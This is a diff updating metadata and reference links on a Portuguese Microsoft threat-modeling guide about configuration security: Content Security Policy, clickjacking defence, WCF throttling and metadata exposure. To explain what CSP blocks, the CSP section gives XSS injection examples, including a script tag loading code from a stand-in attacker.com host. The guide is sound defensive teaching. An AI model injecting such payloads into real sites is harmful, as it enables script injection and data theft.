@@ -1,24 +1,25 @@
 ---
-title: "Gerenciamento de configurações - Microsoft Threat Modeling Tool - Azure | Microsoft Docs"
-description: "atenuações de ameaças expostas na ferramenta de modelagem de ameaças"
+title: Gerenciamento de configurações - Microsoft Threat Modeling Tool - Azure | Microsoft Docs
+description: atenuações de ameaças expostas na ferramenta de modelagem de ameaças
 services: security
 documentationcenter: na
-author: RodSan
-manager: RodSan
-editor: RodSan
+author: jegeib
+manager: jegeib
+editor: jegeib
 ms.assetid: na
 ms.service: security
 ms.workload: na
 ms.tgt_pltfrm: na
 ms.devlang: na
 ms.topic: article
-ms.date: 08/17/2017
-ms.author: rodsan
-ms.openlocfilehash: 1f3de9ba6615a9b2232cca237a822b308d89426d
-ms.sourcegitcommit: 9890483687a2b28860ec179f5fd0a292cdf11d22
+ms.date: 02/07/2017
+ms.author: jegeib
+ms.openlocfilehash: 07a86345e49081320663d7706310a71a40ace134
+ms.sourcegitcommit: 1fb353cfca800e741678b200f23af6f31bd03e87
 ms.translationtype: HT
 ms.contentlocale: pt-BR
-ms.lasthandoff: 01/24/2018
+ms.lasthandoff: 08/30/2018
+ms.locfileid: "43302100"
 ---
 # <a name="security-frame-configuration-management--mitigations"></a>Estrutura de segurança: Gerenciamento de configurações | Atenuações 
 | Produto/Serviço | Artigo |
@@ -41,7 +42,7 @@ ms.lasthandoff: 01/24/2018
 | **Fase do SDL**               | Compilação |  
 | **Tecnologias aplicáveis** | Genérico |
 | **Atributos**              | N/D  |
-| **Referências**              | [Uma introdução à Política de Segurança de Conteúdo](http://www.html5rocks.com/en/tutorials/security/content-security-policy/), [Referência da Política de Segurança de Conteúdo](http://content-security-policy.com/), [Recursos de segurança](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/), [Introdução à Política de Segurança de Conteúdo](https://docs.webplatform.org/wiki/tutorials/content-security-policy), [Posso usar a CSP?](http://caniuse.com/#feat=contentsecuritypolicy) |
+| **Referências**              | [Uma introdução à Política de Segurança de Conteúdo](http://www.html5rocks.com/en/tutorials/security/content-security-policy/), [Referência da Política de Segurança de Conteúdo](http://content-security-policy.com/), [Recursos de segurança](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/), [Introdução à Política de Segurança de Conteúdo](https://github.com/webplatform/webplatform.github.io/tree/master/docs/tutorials/content-security-policy), [Posso usar a CSP?](http://caniuse.com/#feat=contentsecuritypolicy) |
 | **Etapas** | <p>A CSP (Política de Segurança de Conteúdo) é um mecanismo de defesa aprofundado, um padrão de W3C, que permite aos proprietários do aplicativo Web ter controle sobre os conteúdos inseridos em seus sites. A CSP é adicionada como um cabeçalho de resposta HTTP no servidor Web e é aplicada pelos navegadores do cliente. Ela é uma política baseada na lista de permissões; um site pode informar um conjunto de domínios confiáveis, dos quais conteúdos ativos, como JavaScript, podem ser carregados.</p><p>A CSP oferece os seguintes benefícios de segurança:</p><ul><li>**Proteção contra XSS:** se uma página for vulnerável a XSS, um invasor poderá explorá-la de duas maneiras:<ul><li>Injetar `<script>malicious code</script>`: essa exploração não funcionará devido à primeira restrição básica da CSP.</li><li>Injetar `<script src=”http://attacker.com/maliciousCode.js”/>`: essa exploração não funcionará, porque o domínio controlado pelo invasor não estará na lista de domínios permitidos da CSP.</li></ul></li><li>**Controle sobre a pesquisa por dados:** se algum conteúdo mal-intencionado em uma página da Web tentar se conectar a um site externo e roubar dados, a conexão será anulada pelo CSP. Isso acontece porque o domínio de destino não estará na lista de permissões da CSP.</li><li>**Defesa contra furto de clique:** o furto de clique é uma técnica de ataque na qual um invasor adultera um site genuíno e faz com que os usuários cliquem nos elementos de sua interface do usuário. Para se proteger contra o furto de clique atualmente, basta configurar um cabeçalho de resposta X-Frame-Options. Nem todos os navegadores respeitam esse cabeçalho, por isso a CSP será a melhor maneira de se defender contra o furto de clique</li><li>**Relatórios de ataque em tempo real:** se houver um ataque de injeção em um site com a CSP habilitada, os navegadores disparam automaticamente uma notificação para um ponto de extremidade configurado no servidor Web. Dessa forma, a CSP atua como um sistema de aviso em tempo real.</li></ul> |
 
 ### <a name="example"></a>Exemplo
@@ -106,7 +107,7 @@ Example: var str="alert(1)"; eval(str);
 | **Fase do SDL**               | Compilação |  
 | **Tecnologias aplicáveis** | Genérico |
 | **Atributos**              | N/D  |
-| **Referências**              | [Folha de dados do OWASP sobre mecanismos de proteção contra furto de clique](https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet), [Internals IE – Combatendo o furto de clique com X-Frame-Options](https://blogs.msdn.microsoft.com/ieinternals/2010/03/30/combating-click-jacking-with-x-frame-options/) |
+| **Referências**              | [Folha de dados do OWASP sobre mecanismos de proteção contra furto de clique](https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet), [Internals IE – Combatendo o furto de clique com X-Frame-Options](https://blogs.msdn.microsoft.com/ieinternals/2010/03/30/combating-clickjacking-with-x-frame-options/) |
 | **Etapas** | <p>o furto de clique, também conhecido como "ataque de adulteração de interface do usuário", ocorre quando um invasor utiliza várias camadas transparentes ou opacas para fazer com que o usuário clique em um botão ou link de outra página enquanto, na verdade, ele pretendia clicar na página do nível superior.</p><p>Para aplicar essas camadas, é preciso criar uma página mal-intencionada com um iframe para carregar a página da vítima. Assim, o invasor é "sequestra" os cliques destinados a uma página e os encaminha para outra página, que provavelmente pertence a outro aplicativo, domínio ou ambos. Para evitar esse tipo de ataque, defina os cabeçalhos de resposta HTTP de X-Frame-Options adequados que instruem o navegador a não permitir enquadramentos de outros domínios</p>|
 
 ### <a name="example"></a>Exemplo
@@ -561,7 +562,7 @@ Para desabilitar o CORS para um controlador ou uma ação, use o atributo [Disab
 | **Fase do SDL**               | Compilação |  
 | **Tecnologias aplicáveis** | Genérico |
 | **Atributos**              | Opção de gateway - Hub IoT do Azure |
-| **Referências**              | [Visão geral do gerenciamento de dispositivos do Hub IoT](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-overview/), [Como atualizar o firmware do dispositivo](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-device-jobs/) |
+| **Referências**              | [Visão geral do gerenciamento de dispositivos do Hub IoT](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-overview/), [Como atualizar o firmware do dispositivo](https://docs.microsoft.com/azure/iot-hub/tutorial-firmware-update) |
 | **Etapas** | O LWM2M é um protocolo da Open Mobile Alliance destinado ao gerenciamento de dispositivos IoT. O gerenciamento de dispositivos IoT do Azure permite que você interaja com dispositivos físicos usando os trabalhos do dispositivo. Certifique-se de que o Gateway de Nuvem implemente um processo para manter constantemente atualizados o dispositivo e outros dados de configuração usando o gerenciamento de dispositivos do Hub IoT do Azure. |
 
 ## <a id="controls-policies"></a>Garantir que os controles de segurança de ponto de extremidade estejam configurados nos dispositivos de acordo com as políticas organizacionais
@@ -605,7 +606,7 @@ Para desabilitar o CORS para um controlador ou uma ação, use o atributo [Disab
 | **Fase do SDL**               | Compilação |  
 | **Tecnologias aplicáveis** | .NET Framework 3 |
 | **Atributos**              | N/D  |
-| **Referências**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [Fortify Kingdom](https://vulncat.fortify.com/en/vulncat/index.html) |
+| **Referências**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [Fortify Kingdom](https://vulncat.fortify.com) |
 | **Etapas** | <p>Não definir um limite para o uso de recursos do sistema pode resultar no esgotamento de recursos e, por fim, em uma negação de serviço.</p><ul><li>**EXPLICAÇÃO:** o Windows Communication Foundation (WCF) oferece a opção de restringir as solicitações de serviço. Permitir muitas solicitações de clientes pode sobrecarregar o sistema e esgotar seus recursos. Por outro lado, permitir apenas um pequeno número de solicitações para um serviço pode impedir usuários legítimos de usar o serviço. Cada serviço deve ser ajustado e configurado individualmente para permitir a quantidade apropriada de recursos.</li><li>**RECOMENDAÇÕES** Habilite o recurso de limitação de serviços do WCF e defina os limites apropriados para o aplicativo.</li></ul>|
 
 ### <a name="example"></a>Exemplo
@@ -628,7 +629,7 @@ Veja abaixo um exemplo de configuração com a limitação habilitada:
 | **Fase do SDL**               | Compilação |  
 | **Tecnologias aplicáveis** | .NET Framework 3 |
 | **Atributos**              | N/D  |
-| **Referências**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [Fortify Kingdom](https://vulncat.fortify.com/en/vulncat/index.html) |
+| **Referências**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [Fortify Kingdom](https://vulncat.fortify.com) |
 | **Etapas** | Os metadados podem ajudar invasores a obter mais informações sobre o sistema e a planejar uma forma de ataque. Os serviços do WCF podem ser configurados para expor os metadados, que fornecem informações descritivas detalhadas do serviço e que não devem ser transmitidos em ambientes de produção. As propriedades `HttpGetEnabled` / `HttpsGetEnabled` da classe ServiceMetaData definem se um serviço deve expor os metadados. | 
 
 ### <a name="example"></a>Exemplo
